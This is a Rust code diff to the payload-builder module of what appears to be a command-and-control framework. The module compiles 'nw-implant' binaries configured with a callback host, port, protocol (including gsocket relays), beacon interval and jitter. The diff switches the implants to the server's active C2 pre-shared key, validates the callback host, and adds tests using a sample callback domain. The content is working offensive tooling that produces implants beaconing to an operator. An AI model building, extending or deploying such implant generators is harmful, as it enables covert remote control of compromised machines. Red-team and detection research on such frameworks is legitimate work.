@@ -15,7 +15,6 @@ pub struct BuildRequest {
     pub lhost: String,
     #[serde(default)]
     pub lport: u16,
-    pub psk: String,
     pub protocol: String,
     #[serde(default)]
     pub gsocket_secret: Option<String>,
@@ -41,7 +40,6 @@ pub struct PayloadMeta {
     pub protocol: String,
     pub lhost: String,
     pub lport: u16,
-    pub psk: String,
     #[serde(default)]
     pub interval_ms: u64,
     #[serde(default)]
@@ -195,7 +193,22 @@ fn build_id(name: &str, os: &str, arch: &str) -> String {
     format!("{name}.{os}.{arch}")
 }
 
-pub async fn build(req: &BuildRequest) -> Result<PayloadMeta> {
+fn valid_dns_host(host: &str) -> bool {
+    let host = host.strip_suffix('.').unwrap_or(host);
+    !host.is_empty()
+        && host.len() <= 253
+        && host.split('.').all(|label| {
+            !label.is_empty()
+                && label.len() <= 63
+                && !label.starts_with('-')
+                && !label.ends_with('-')
+                && label
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
+        })
+}
+
+pub async fn build(req: &BuildRequest, c2_psk: &[u8]) -> Result<PayloadMeta> {
     let name = if sanitize(&req.name).is_empty() {
         "implant".to_owned()
     } else {
@@ -214,7 +227,7 @@ pub async fn build(req: &BuildRequest) -> Result<PayloadMeta> {
         started_at: chrono::Utc::now().to_rfc3339(),
     });
 
-    let result = do_build(req, &name, &file).await;
+    let result = do_build(req, c2_psk, &name, &file).await;
     unmark_building(&file);
     result
 }
@@ -272,8 +285,14 @@ async fn toolchain_rustc() -> Option<PathBuf> {
     p.is_file().then_some(p)
 }
 
-async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadMeta> {
-    let (payload_config, metadata_host, metadata_port) = if req.protocol == "gs" {
+fn payload_config(
+    req: &BuildRequest,
+    c2_psk: &[u8],
+) -> Result<(nw_profile::config::PayloadConfig, String, u16)> {
+    let psk = std::str::from_utf8(c2_psk)
+        .context("the active C2 PSK is not valid UTF-8")?
+        .to_owned();
+    if req.protocol == "gs" {
         let secret = req
             .gsocket_secret
             .as_deref()
@@ -284,10 +303,10 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
             .gsocket_local_port
             .filter(|port| *port > 0)
             .unwrap_or(req.lport);
-        (
+        Ok((
             nw_profile::config::PayloadConfig {
                 endpoint: format!("gs://127.0.0.1:{local_port}"),
-                psk: req.psk.clone(),
+                psk,
                 gsocket: Some(nw_profile::config::GSocketConfig {
                     secret: secret.to_owned(),
                     local_port,
@@ -295,18 +314,46 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
             },
             "127.0.0.1".to_owned(),
             local_port,
-        )
+        ))
     } else {
-        (
+        let host = req.lhost.trim();
+        let parsed_ip = host.parse::<std::net::IpAddr>().ok();
+        anyhow::ensure!(
+            !host.is_empty()
+                && !host.contains("://")
+                && !host.contains('/')
+                && !host.contains('?')
+                && !host.contains('#')
+                && !host.chars().any(char::is_whitespace),
+            "callback LHost must contain the host only, without a scheme, port, or URL path"
+        );
+        anyhow::ensure!(
+            parsed_ip.is_some() || valid_dns_host(host),
+            "callback LHost must be a valid DNS name or IP address"
+        );
+        let endpoint_host = match parsed_ip {
+            Some(std::net::IpAddr::V6(_)) => format!("[{host}]"),
+            _ => host.to_owned(),
+        };
+        Ok((
             nw_profile::config::PayloadConfig {
-                endpoint: format!("{}://{}:{}", req.protocol, req.lhost, req.lport),
-                psk: req.psk.clone(),
+                endpoint: format!("{}://{}:{}", req.protocol, endpoint_host, req.lport),
+                psk,
                 gsocket: None,
             },
-            req.lhost.clone(),
+            host.to_owned(),
             req.lport,
-        )
-    };
+        ))
+    }
+}
+
+async fn do_build(
+    req: &BuildRequest,
+    c2_psk: &[u8],
+    name: &str,
+    file: &str,
+) -> Result<PayloadMeta> {
+    let (payload_config, metadata_host, metadata_port) = payload_config(req, c2_psk)?;
     let workspace = env!("CARGO_MANIFEST_DIR");
     let bin = cargo_bin();
     let mut args = vec!["build", "--release", "-p", "nw-implant"];
@@ -352,7 +399,6 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
         protocol: req.protocol.clone(),
         lhost: metadata_host,
         lport: metadata_port,
-        psk: req.psk.clone(),
         interval_ms: req.interval_ms,
         jitter_ms: req.jitter_ms,
         target: req.target.clone(),
@@ -396,17 +442,25 @@ fn list_from_dir(dir: &Path) -> Result<Vec<PayloadMeta>> {
             continue;
         }
         let sidecar = dir.join(format!("{fname}.json"));
-        let mut meta = if sidecar.exists() {
-            serde_json::from_slice::<PayloadMeta>(&std::fs::read(&sidecar)?)
-                .unwrap_or_else(|_| fallback_meta(&fname, &path))
+        let (mut meta, contained_legacy_psk) = if sidecar.exists() {
+            let bytes = std::fs::read(&sidecar)?;
+            let contained_legacy_psk = serde_json::from_slice::<serde_json::Value>(&bytes)
+                .ok()
+                .and_then(|value| value.as_object().map(|object| object.contains_key("psk")))
+                .unwrap_or(false);
+            (
+                serde_json::from_slice::<PayloadMeta>(&bytes)
+                    .unwrap_or_else(|_| fallback_meta(&fname, &path)),
+                contained_legacy_psk,
+            )
         } else {
-            fallback_meta(&fname, &path)
+            (fallback_meta(&fname, &path), false)
         };
         meta.file = fname;
         let public_id = valid_public_uuid(&meta.public_id)
             .unwrap_or_else(Uuid::new_v4)
             .to_string();
-        if meta.public_id != public_id {
+        if meta.public_id != public_id || contained_legacy_psk {
             meta.public_id = public_id;
             write_metadata_atomic(&sidecar, &meta)?;
         }
@@ -478,7 +532,6 @@ fn fallback_meta(fname: &str, path: &Path) -> PayloadMeta {
         protocol: "unknown".into(),
         lhost: "unknown".into(),
         lport: 0,
-        psk: "".into(),
         interval_ms: 0,
         jitter_ms: 0,
         target: String::new(),
@@ -520,11 +573,6 @@ pub fn public_download(token: &str) -> Option<(PathBuf, String)> {
     index.resolve(token)
 }
 
-/// Fresh random PSK for the build form default.
-pub fn random_psk() -> String {
-    Uuid::new_v4().to_string()
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -562,7 +610,6 @@ mod tests {
             name: "win-1".into(),
             lhost: "127.0.0.1".into(),
             lport: 8080,
-            psk: "x".into(),
             protocol: "http".into(),
             gsocket_secret: None,
             gsocket_local_port: None,
@@ -578,6 +625,55 @@ mod tests {
         assert_eq!(recent_errors()[0].0, "win-1.windows.amd64");
         clear_build_errors("win-1.windows.amd64");
         assert!(recent_errors().is_empty());
+    }
+
+    #[test]
+    fn direct_callback_config_uses_the_active_server_psk() {
+        let req = BuildRequest {
+            name: "linux".into(),
+            lhost: "gateofbabylon.space".into(),
+            lport: 443,
+            protocol: "https".into(),
+            os: "linux".into(),
+            arch: "amd64".into(),
+            ..Default::default()
+        };
+
+        let (config, host, port) = payload_config(&req, b"active-server-secret").unwrap();
+
+        assert_eq!(config.endpoint, "https://gateofbabylon.space:443");
+        assert_eq!(config.psk, "active-server-secret");
+        assert_eq!(host, "gateofbabylon.space");
+        assert_eq!(port, 443);
+    }
+
+    #[test]
+    fn direct_callback_config_rejects_a_url_path_in_lhost() {
+        let req = BuildRequest {
+            lhost: "gateofbabylon.space/c2/checkin".into(),
+            lport: 443,
+            protocol: "https".into(),
+            ..Default::default()
+        };
+
+        let error = payload_config(&req, b"active-server-secret").unwrap_err();
+
+        assert!(error.to_string().contains("host only"));
+    }
+
+    #[test]
+    fn direct_callback_config_brackets_an_ipv6_lhost() {
+        let req = BuildRequest {
+            lhost: "2001:db8::10".into(),
+            lport: 443,
+            protocol: "https".into(),
+            ..Default::default()
+        };
+
+        let (config, host, _) = payload_config(&req, b"active-server-secret").unwrap();
+
+        assert_eq!(config.endpoint, "https://[2001:db8::10]:443");
+        assert_eq!(host, "2001:db8::10");
     }
 
     #[test]
@@ -618,6 +714,48 @@ mod tests {
         let persisted: serde_json::Value =
             serde_json::from_slice(&std::fs::read(sidecar).unwrap()).unwrap();
         assert_eq!(persisted["public_id"], public_id);
+        assert!(persisted.get("psk").is_none());
+    }
+
+    #[test]
+    fn direct_callback_config_rejects_non_host_authority_syntax() {
+        for host in [
+            "good.example@evil.example",
+            "good.example\\@evil.example",
+            "good.example%2fevil",
+            "good.example:443",
+            "-bad.example",
+        ] {
+            let req = BuildRequest {
+                lhost: host.into(),
+                lport: 443,
+                protocol: "https".into(),
+                ..Default::default()
+            };
+
+            assert!(
+                payload_config(&req, b"active-server-secret").is_err(),
+                "accepted invalid host {host:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn gsocket_config_uses_server_psk_and_keeps_relay_secret_separate() {
+        let req = BuildRequest {
+            protocol: "gs".into(),
+            lport: 4630,
+            gsocket_secret: Some("relay-secret".into()),
+            gsocket_local_port: Some(4630),
+            ..Default::default()
+        };
+
+        let (config, host, port) = payload_config(&req, b"active-server-secret").unwrap();
+
+        assert_eq!(config.psk, "active-server-secret");
+        assert_eq!(config.gsocket.unwrap().secret, "relay-secret");
+        assert_eq!(host, "127.0.0.1");
+        assert_eq!(port, 4630);
     }
 
     #[test]
